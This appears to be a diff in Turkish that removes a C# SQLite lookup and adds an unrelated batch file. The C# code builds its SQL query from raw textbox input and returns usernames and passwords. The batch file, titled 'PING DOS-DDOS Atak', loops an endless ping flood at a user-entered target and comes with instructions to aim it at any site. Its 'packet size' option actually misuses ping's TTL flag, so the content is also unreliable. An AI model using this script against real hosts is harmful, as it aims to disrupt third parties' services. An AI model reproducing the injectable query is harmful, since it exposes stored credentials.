@@ -1,26 +1,36 @@
-using System.Data.SQLite; // SQLite kütüphanesini çağrıyoruz.
+- Aşağıdaki komutları Ping.bat veya DDOS.bat olarak kaydedin.
 
-string programYolu = Application.StartupPath; // Programın çalştığı klasör yolu.
 
-string sqliteYolu = $"Data source={programYolu}\\dbName.db;Version=3;";
+@echo off
+mode 65,30
+title PING DOS-DDOS Atak
+color 02
+cls
+echo.
+echo -------------------
+echo PING DOS-DDOS Atak
+echo -------------------
+echo.
+set /p hedef=Hedef Site:
+echo.
+echo -------------------
+ping %hedef%
+echo -------------------
+@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
+goto Next
+:Next
+echo.
+echo.
+echo.
+set /p m=Hedef IP Adresi:
+echo.
+set /p n=Paket Boyutu:
+echo.
+:DDOS
+color 0c
+echo SALDIRI YAPILIYOR %m%
+ping %m% -i %n% -t >nul
+goto DDOS
 
-using (var baglan = new SQLiteConnection(sqliteYolu)) // SQLite bağlantı.
-{
-	using(var komut = new SQLiteCommand($"SELECT * FROM kullanicilar WHERE id={textBox1.Text}", baglan))
-	{
-		try
-		{
-			komut.Connection.Open();
-			SQLiteDataReader dtr = komut.ExecuteReader();
-			if(dtr.Read())
-			{
-				textBox2.Text = dtr["kullaniciadi"].ToString();
-				textBox3.Text = dtr["sifre"].ToString();
-			}
-		}
-		catch (Exception hata)
-		{
-			MessageBox.Show(hata.Message);
-		}
-	}
-}
+
+- Oluşturduğunuz bat dosyasını açın. Herhangi bir site adresi yazın. Standart ping komutundan sonra hedef IP kısmına sitenin IP adresini yazın. Paket boyutu kısmına herhangi bir sayı yazın 10000 veya 1000000 sonra paketler gönderilecektir.
